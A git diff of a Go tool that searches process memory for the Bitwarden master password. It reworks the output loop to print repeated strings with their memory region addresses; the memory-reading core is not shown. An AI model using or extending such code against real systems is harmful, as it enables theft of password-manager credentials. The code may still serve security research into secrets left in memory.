@@ -47,9 +47,6 @@ func main() {
 		log.Fatalf("[!] No supported processes found!")
 	}
 
-	aSlice := []string{}
-	bSlice := []string{}
-	//previousValue := ""
 	// Search each targetProcs process memory
 	for i := range targetProcs {
 		p := targetProcs[i]
@@ -64,41 +61,18 @@ func main() {
 			continue
 		}
 
-		fmt.Printf("[+] ------- Complete ---------\n")
-		for _, y := range results {
+		fmt.Printf("[+] Results: \n\n")
+		for _, result := range results {
 
-			for i := 1; i < len(y); i++ {
+			for i := 1; i < len(result); i++ {
+				// Shows too many results
+				//fmt.Printf("[+] %s\n", result[i].str)
 
-				aSlice = append(aSlice, y[i].str)
-				//for _, z := range y {
-				if strings.Contains(y[i].str, y[i-1].str) {
-
-					// Append consecutive occurrences
-					bSlice = append(bSlice, y[i].str)
-					//fmt.Printf("[+] %s\n", y[i].str)
-				}
-
-				//fmt.Printf("[+] Output: %s \t at Index: %d (Offset 0x%x - 0x%x)\n", z.str, z.index, z.startOffset, z.endOffset)
-				//fmt.Printf("[+] MemoryRegion: 0x%x\n", z.memRegion)
-				//fmt.Printf("[+] RegionSize: 0x%x\n", z.memSize)
-				//fmt.Printf("[+] Index: %d (Offset 0x%x - 0x%x)\n", z.index, z.startOffset, z.endOffset)
-				//fmt.Printf("[+] %s\n", z.str)
-
-			}
-		}
-	}
-
-	if len(bSlice) != 0 {
-		// Compare slices
-		for _, x := range bSlice {
-			for _, y := range aSlice {
-				if x == y {
-					break
-				}
-				if strings.Contains(y, x) {
-
-					fmt.Printf("[+] %q\n", y)
-
+				// Compare string with previous occurrence, as the
+				// Bitwarden master password is repeated several times
+				if strings.Contains(result[i].str, result[i-1].str) {
+					// Show memory region location
+					fmt.Printf("[mem region: 0x%x] => %s\n", result[i].memRegion, result[i].str)
 				}
 			}
 		}
